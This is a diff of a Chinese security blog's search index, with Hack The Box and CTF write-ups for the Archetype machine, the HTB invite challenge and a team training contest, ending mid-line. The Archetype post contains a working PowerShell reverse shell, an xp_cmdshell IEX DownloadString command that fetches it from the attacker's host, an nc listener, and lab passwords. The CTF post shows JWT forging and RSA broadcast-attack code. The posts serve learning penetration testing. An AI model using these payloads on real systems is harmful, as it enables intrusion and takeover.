@@ -1,212 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HTB VPN配置</title>
-    <url>/2021/03/13/HTB-VPN%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="HTB-VPN配置"><a href="#HTB-VPN配置" class="headerlink" title="HTB VPN配置"></a>HTB VPN配置</h3><p>服务器： 阿里云 ubuntu</p>
-<p>在服务器安装openvpn</p>
-<p><code>apt-get update</code></p>
-<p><code>apt-get install openvpn</code></p>
-<p>在HTB的Labs页面中找到连接Starting Point</p>
-<p><a href="/images/20210313190126.png" class="gallery-item"><img src="/images/20210313190126.png"></a></p>
-<p>选择好其中一个节点进行下载.ovpn文件</p>
-<a href="/images/20210313185138.png" class="gallery-item"><img src="/images/20210313185138.png" style="zoom:50%;" /></a>
-
-<p>在服务器用openvpn连接到staring point</p>
-<p><code>openvpn starting_point_XXXXX.ovpn</code></p>
-<p>点击Archetype机器，选择Jion Machine，加入之后会告诉你该机器的IP地址</p>
-<a href="/images/20210313185915.png" class="gallery-item"><img src="/images/20210313185915.png" style="zoom: 50%;" /></a>
-
-<p>在服务器ping该地址，可以ping通</p>
-<a href="/images/20210313190251.png" class="gallery-item"><img src="/images/20210313190251.png" style="zoom:50%;" /></a>
-
-<p>测试VPN已经搭建完成</p>
-</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>]]></content>
-      <categories>
-        <category>HTB</category>
-        <category>Hacker</category>
-        <category>Security</category>
-        <category>Penetration testing</category>
-      </categories>
-      <tags>
-        <tag>HTB</tag>
-        <tag>Study life</tag>
-        <tag>Penetration testing</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB-Archetype WriteUp</title>
-    <url>/2021/04/13/HTB-Archetype%20WriteUp/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
-<a href="/images/20210313210153.png" class="gallery-item"><img src="/images/20210313210153.png" style="zoom:67%;" /></a>
-
-<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
-<ul>
-<li><p>135端口为RPC，可以进行口令爆破</p>
-</li>
-<li><p>139端口为NetBIOS</p>
-</li>
-<li><p>445端口为SMB文件共享</p>
-</li>
-<li><p>1433端口与SQL服务有关</p>
-</li>
-</ul>
-<h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
-<p><code>smbclient -L 10.10.10.27</code></p>
-<a href="/images/20210313204721.png" class="gallery-item"><img src="/images/20210313204721.png" style="zoom:67%;" /></a>
-
-<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
-<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
-<p><code>smbclient //10.10.10.27/backups</code></p>
-<p>回车</p>
-<p>然后用<code>ls</code>查看backups文件内容</p>
-<p>用<code>get</code>获取prod.dtsConfig文件</p>
-<a href="/images/20210313205904.png" class="gallery-item"><img src="/images/20210313205904.png" style="zoom: 67%;" /></a>
-
-<p>prod.dtsConfig文件就下载到了我们服务器中</p>
-<a href="/images/20210313212722.png" class="gallery-item"><img src="/images/20210313212722.png" style="zoom:67%;" /></a>
-
-<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
-<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
-<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
-<h3 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h3><p>这边需要下载impacket工具</p>
-<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
-<p><code>cd impacket</code></p>
-<p><code>python3 setup.py install</code></p>
-<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
-<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
-<p><code>M3g4c0rp123</code></p>
-<a href="/images/Lily_Screenshot_1615812452.png" class="gallery-item"><img src="/images/Lily_Screenshot_1615812452.png" style="zoom:67%;" /></a>
-
-<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
-<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
-<a href="/images/image-20210315205958962.png" class="gallery-item"><img src="/images/image-20210315205958962.png" style="zoom: 67%;" /></a>
-
-<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
-
-<p>其中执行whoami的结果显示如下</p>
-<a href="/images/image-20210315213821244.png" class="gallery-item"><img src="/images/image-20210315213821244.png" style="zoom:67%;" /></a>
-
-<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
-<p>创建一个shell.ps1脚本，内容如下</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="variable">$stream</span> =<span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">065535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> =<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> |<span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> =([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
-
-<p>查一下本地ip地址</p>
-<p><code>ifconfig tun0</code></p>
-<p>得知本机在局域网内的ip为10.10.16.10</p>
-<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
-<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
-<p><code>python3 -m http.server 81</code></p>
-<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
-<p><code>nc -nlvp 443</code></p>
-<p>接下来进sql窗口执行下列命令</p>
-<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
-<p>在http和nc窗口同时得到反馈</p>
-<p><a href="/images/image-20210413221428797.png" class="gallery-item"><img src="/images/image-20210413221428797.png"></a></p>
-<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
-<a href="/images/image-20210413214419239.png" class="gallery-item"><img src="/images/image-20210413214419239.png" style="zoom:67%;" /></a>
-
-<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
-<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
-<p><a href="/images/image-20210413215004497.png" class="gallery-item"><img src="/images/image-20210413215004497.png"></a></p>
-<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
-<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
-<p><a href="/images/image-20210413221145501.png" class="gallery-item"><img src="/images/image-20210413221145501.png"></a></p>
-<p>进入到管理员桌面，取得root.txt</p>
-<a href="/images/image-20210413215944832.png" class="gallery-item"><img src="/images/image-20210413215944832.png" style="zoom:50%;" /></a>
-
-<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
-</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>]]></content>
-      <categories>
-        <category>HTB</category>
-        <category>Hacker</category>
-        <category>Security</category>
-        <category>Penetration testing</category>
-      </categories>
-      <tags>
-        <tag>HTB</tag>
-        <tag>Study life</tag>
-        <tag>Penetration testing</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HacktheBox注册挑战</title>
-    <url>/2021/03/13/HacktheBox%E6%B3%A8%E5%86%8C%E6%8C%91%E6%88%98/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="HacktheBox注册挑战"><a href="#HacktheBox注册挑战" class="headerlink" title="HacktheBox注册挑战"></a>HacktheBox注册挑战</h3><p>HacktheBox是一个在线靶场，近期准备考OSCP，准备拿靶场练练手。</p>
-<p>HacktheBox的注册有一定的门槛，在这里记录一下解决过程。</p>
-<p><a href="/images/20210313162402.png" title="注册页面1" class="gallery-item"><img src="/images/20210313162402.png" alt="注册页面1"></a></p>
-<p>点击HACK YOUR WAY IN</p>
-<p><a href="/images/20210313162502.png" title="注册页面2" class="gallery-item"><img src="/images/20210313162502.png" alt="注册页面2"></a></p>
-<p>在注册页面首先需要输入code，我们先看hint，点击Click Here</p>
-<p><a href="/images/20210313162644.png" title="注册码线索" class="gallery-item"><img src="/images/20210313162644.png" alt="注册码线索"></a></p>
-<p>提示我们需要检测console</p>
-<p>打开控制台，看到这样的信息</p>
-<a href="/images/20210313162823.png" title="console信息" class="gallery-item"><img src="/images/20210313162823.png" alt="console信息" style="zoom: 67%;" /></a>
-
-<p>提示我们需要找一个有趣的js文件，进入sources下的page查看调用的js文件，找到一个带有注释的js，提示我们这个js可能被混淆了</p>
-<a href="/images/20210313163055.png" title="js文件" class="gallery-item"><img src="/images/20210313163055.png" alt="js文件" style="zoom:67%;" /></a>
-
-<p>这个js的内容为eval类型的混淆，经过代码格式化后，eval中function的内容如下</p>
-<a href="/images/20210313163251.png" title="js中function代码" class="gallery-item"><img src="/images/20210313163251.png" alt="js中function代码" style="zoom:50%;" /></a>
-
-<p>包含6个参数，并且给了参数的内容</p>
-<p>这边给出两种解混淆的方案</p>
-<ul>
-<li>直接查找反混淆网站，因为是eval类型，反混淆比较容易<ul>
-<li>eval类型的js反混淆网站：<a href="https://www.bm8.com.cn/jsConfusion/">https://www.bm8.com.cn/jsConfusion/</a></li>
-</ul>
-</li>
-<li>vs运行一遍，在最后return p的地方下一个断点，直接查看p的内容<ul>
-<li><a href="/images/20210313171250.png" title="vs调试" class="gallery-item"><img src="/images/20210313171250.png" alt="vs调试"></a></li>
-</ul>
-</li>
-</ul>
-<p>最后得到eval的执行内容</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeInviteCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/invite/how/to/generate&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据执行内容要求我们用POST访问&#x2F;api&#x2F;invite&#x2F;how&#x2F;to&#x2F;generate</p>
-<p>用hackbar执行（或者postman）</p>
-<a href="/images/20210313164219.png" title="how-to-generate" class="gallery-item"><img src="/images/20210313164219.png" alt="how-to-generate" style="zoom: 67%;" /></a>
-
-<p>得到如图json内容，该内容可能会改变为ROT13解密方式，但结果应该是一致的</p>
-<p>复制data内容，用hackbar解base64内容</p>
-<a href="/images/20210313164520.png" title="hackbar解base64" class="gallery-item"><img src="/images/20210313164520.png" alt="hackbar解base64" style="zoom:67%;" /></a>
-
-<p>提示我们需要再用post访问&#x2F;api&#x2F;invite&#x2F;generate</p>
-<p>访问获取json内容为</p>
-<p><a href="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" title="注册码code1" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313164702.png" alt="注册码code1"></a></p>
-<p>很容易看出这是base64，重复上述操作，用hackbar解密base64内容得到注册码（该注册码是动态变化的）</p>
-<p><code>JBIXF-QDULC-CEBFM-OTBAW-DKHYP</code></p>
-<p>填入之后就可以注册了</p>
-</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js@1.2.0/dist/lg-fullscreen.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js@1.2.0/dist/lg-autoplay.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-video.js@1.3.0/dist/lg-video.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-hash.js@1.0.0/dist/lg-hash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lg-pager.js@1.0.0/dist/lg-pager.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Hacker</category>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>Study life</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C++流量包分析——王者荣耀APP&amp;Line App</title>
     <url>/2021/04/13/C++%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80APP&amp;Line%20App/</url>
     <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="网络行为学导论作业"><a href="#网络行为学导论作业" class="headerlink" title="网络行为学导论作业"></a>网络行为学导论作业</h2><h3 id="“王者荣耀”流量数据包分析"><a href="#“王者荣耀”流量数据包分析" class="headerlink" title="“王者荣耀”流量数据包分析"></a>“王者荣耀”流量数据包分析</h3><p>编码环境：gcc 9.3.0</p>
@@ -309,58 +103,95 @@
         <category>Traffic Analysis</category>
       </categories>
       <tags>
-        <tag>Study life</tag>
         <tag>course</tag>
+        <tag>Study life</tag>
         <tag>Traffic Analysis</tag>
       </tags>
   </entry>
   <entry>
-    <title>NeSE丙队1月月赛训练</title>
-    <url>/2021/01/22/NeSE%E4%B8%99%E9%98%9F1%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x00-misc1"><a href="#0x00-misc1" class="headerlink" title="0x00 misc1"></a>0x00 misc1</h4><p>签到题</p>
-<p>直接下载png文件，打开是一个二维码，直接扫码得到</p>
-<p>flag{B1ue_Bing0}</p>
-<h4 id="0x01-stego"><a href="#0x01-stego" class="headerlink" title="0x01 stego"></a>0x01 stego</h4><p>下载文件stego.png</p>
-<p>打开是一个放假通知，用binwalk查看内容</p>
-<p><a href="/images/20210125095532.png" title="image-20210125095532" class="gallery-item"><img src="/images/20210125095532.png" alt="image-20210125095532"></a></p>
-<p>可以得到这个png含有zip文件，根据图种特点，直接修改后缀.zip，有一个文件名为1的文件，直接打开得到</p>
-<p>flag{ez_z1p_st3g0}</p>
-<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x02-admin"><a href="#0x02-admin" class="headerlink" title="0x02 admin"></a>0x02 admin</h4><p>跳转进入网页显示不是admin，无法获取flag</p>
-<p>利用burpsuite抓包看到jwt_token，格式为{header}.{payload}.{verify signature}</p>
-<p>前两个用base64解密，得到header&#x3D;{“alg”:”HS256”,”type”:”JWT”}，payload&#x3D;{“user”:”tourist”} <del>大概是这样，忘记了</del></p>
-<p>jwt_token后面跟着key&#x3D;blueNeSE，verify signature的验证的公式为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  key</span><br><span class="line">) </span><br></pre></td></tr></table></figure>
+    <title>HTB-Archetype WriteUp</title>
+    <url>/2021/04/13/HTB-Archetype%20WriteUp/</url>
+    <content><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
+<a href="/images/20210313210153.png" class="gallery-item"><img src="/images/20210313210153.png" style="zoom:67%;" /></a>
 
-<p>通过jwt网站<a href="https://jwt.io/%E8%AE%A1%E7%AE%97%E9%AA%8C%E8%AF%81key%E7%A1%AE%E5%AE%9E%E4%B8%BAblueNeSE%EF%BC%8C%E6%9B%B4%E6%94%B9payload%E4%B8%BA%7B%22user%22:%22admin%22%7D%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E9%AA%8C%E8%AF%81%E7%9A%84jwt_token">https://jwt.io/计算验证key确实为blueNeSE，更改payload为{&quot;user&quot;:&quot;admin&quot;}，自动生成验证的jwt_token</a></p>
-<p>修改jwt_token重放包，得到flag<del>忘了</del></p>
-<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="0x03-jefferson-wheel"><a href="#0x03-jefferson-wheel" class="headerlink" title="0x03 jefferson wheel"></a>0x03 jefferson wheel</h4><p>加密表为</p>
-<p>ZWAXJGDLUBVIQHKEPNTCRMOSFY&gt;<br>KPBRLNACZDTEXMJQOYHGVSFUWI&gt;<br>BDMAIZVNHSJUWFRTEQGYXPLOCK&gt;<br>RPLHDVNGFCUKTEBSXQYIZMJWAO&gt;<br>IHFRLABEUOTSGJVDKZPMNCQWXY&gt;<br>AMKGHBWPNYCJIFZDRUSLOQXVET&gt;<br>GWTHMPYBXIZULVKSRAFDCEONJQ&gt;<br>NOZUTWDCVRJLXKISYFAPMEGHBQ&gt;<br>XPLTDSRFGENYVUBMCQWAOIKZHJ&gt;<br>UDNAJFBOWCGVRSTZQKELMXYIHP&gt;<br>MNCVBXZQWERTPOIUYALSKDJFHG&gt;<br>LVNCMXZPQOWEJURYTASBKIDFHG&gt;<br>JZQAWVXCDERFSBGTYHNUMKILOP&gt;<br>KQDLOEJPCNFXBIWZGRYMTVHSUA&gt;<br>PVLUBFJSXOWAYGNEIDZTMHCRQK&gt;</p>
-<p>根据密钥[5-9-14-13-1-7-2-12-4-10-6-3-11-15-8]，重组加密表，得到新表为</p>
-<p>IHFRLABEUOTSGJVDKZPMNCQWXY&gt;<br>XPLTDSRFGENYVUBMCQWAOIKZHJ&gt;<br>KQDLOEJPCNFXBIWZGRYMTVHSUA&gt;<br>JZQAWVXCDERFSBGTYHNUMKILOP&gt;<br>ZWAXJGDLUBVIQHKEPNTCRMOSFY&gt;<br>GWTHMPYBXIZULVKSRAFDCEONJQ&gt;<br>KPBRLNACZDTEXMJQOYHGVSFUWI&gt;<br>LVNCMXZPQOWEJURYTASBKIDFHG&gt;<br>RPLHDVNGFCUKTEBSXQYIZMJWAO&gt;<br>UDNAJFBOWCGVRSTZQKELMXYIHP&gt;<br>AMKGHBWPNYCJIFZDRUSLOQXVET&gt;<br>BDMAIZVNHSJUWFRTEQGYXPLOCK&gt;<br>MNCVBXZQWERTPOIUYALSKDJFHG&gt;<br>PVLUBFJSXOWAYGNEIDZTMHCRQK&gt;<br>NOZUTWDCVRJLXKISYFAPMEGHBQ&gt;</p>
-<p>根据密文[Q-J-K-B-P-P-X-D-G-G-F-T-V-U-G]，转动新表得到</p>
-<p>QWXYIHFRLABEUOTSGJVDKZPMNC<br>JXPLTDSRFGENYVUBMCQWAOIKZH<br>KQDLOEJPCNFXBIWZGRYMTVHSUA<br>BGTYHNUMKILOPJZQAWVXCDERFS<br>PNTCRMOSFYZWAXJGDLUBVIQHKE<br>PYBXIZULVKSRAFDCEONJQGWTHM<br>XMJQOYHGVSFUWIKPBRLNACZDTE<br>DFHGLVNCMXZPQOWEJURYTASBKI<br>GFCUKTEBSXQYIZMJWAORPLHDVN<br>GVRSTZQKELMXYIHPUDNAJFBOWC<br>FZDRUSLOQXVETAMKGHBWPNYCJI<br>TEQGYXPLOCKBDMAIZVNHSJUWFR<br>VBXZQWERTPOIUYALSKDJFHGMNC<br>UBFJSXOWAYGNEIDZTMHCRQKPVL<br>GHBQNOZUTWDCVRJLXKISYFAPME</p>
-<p>根据语义，最后一列为flag{chasemeincircle}<del>忘了是大写还是小写</del></p>
-<h4 id="0x04-广播"><a href="#0x04-广播" class="headerlink" title="0x04 广播"></a>0x04 广播</h4><p>下载broadcast.zip和hint.txt</p>
-<p>zip压缩文件内容加密，根据hint.txt得知密码为18位，且是简单的编码方式</p>
-<p>猜测关键词为broadcast，共9位，推测为十六进制编码（十进制会产生1位数对3位数，base64则是1位对4&#x2F;3位）</p>
-<p>利用62726f616463617374解压成功，得到{c3 c2 c1 n3 n2 n1}，根据题目也可以看出为RSA广播攻击</p>
-<p>编写对应的代码如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gmpy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_parse_number</span>(<span class="params">number</span>):</span><br><span class="line">    string = <span class="string">&quot;%x&quot;</span> % number</span><br><span class="line">    <span class="comment">#if len(string) != 64:</span></span><br><span class="line">    <span class="comment">#    return &quot;&quot;</span></span><br><span class="line">    erg = []</span><br><span class="line">    <span class="keyword">while</span> string != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        erg = erg + [<span class="built_in">chr</span>(<span class="built_in">int</span>(string[:<span class="number">2</span>], <span class="number">16</span>))]</span><br><span class="line">        string = string[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(erg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    x,y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, (q, b) = b, <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, lastx = lastx-q*x, x</span><br><span class="line">        y, lasty = lasty-q*y, y</span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder_theorem</span>(<span class="params">items</span>):</span><br><span class="line">  N = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    N *= n</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> a, n <span class="keyword">in</span> items:</span><br><span class="line">    m = N//n</span><br><span class="line">    r, s, d = extended_gcd(n, m)</span><br><span class="line">    <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">      N=N/n</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">      <span class="comment">#raise &quot;Input not pairwise co-prime&quot;</span></span><br><span class="line">    result += a*s*m</span><br><span class="line">  <span class="keyword">return</span> result % N, N</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = m**e mod n1</span></span><br><span class="line"><span class="string">c2 = m**e mod n2</span></span><br><span class="line"><span class="string">c3 = m**e mod n3</span></span><br><span class="line"><span class="string">. .</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sessions=[&#123;<span class="string">&quot;c&quot;</span>: <span class="number">2664456240866799628123354002961100780678777039452838534772316015487055657626151267255765909925238851052963177690615857269355367306531947285275658480119132176458619666356498982335615976520110220831553046336962209497199269751531446896806745547821273188359881207253304353340193045529947532321421316207582669186966262885925510852080336597611720270953364182776647640895915836757533572112922353511839592221769714011077657473370681864919378759906166093497668584965809250367719086157929143483067084526466393322021886107145372853920384593331401647566014964198106822275155018727443981449124990082600675418608431513247974233406</span>, <span class="string">&quot;e&quot;</span>: <span class="number">3</span>, <span class="string">&quot;n&quot;</span>: <span 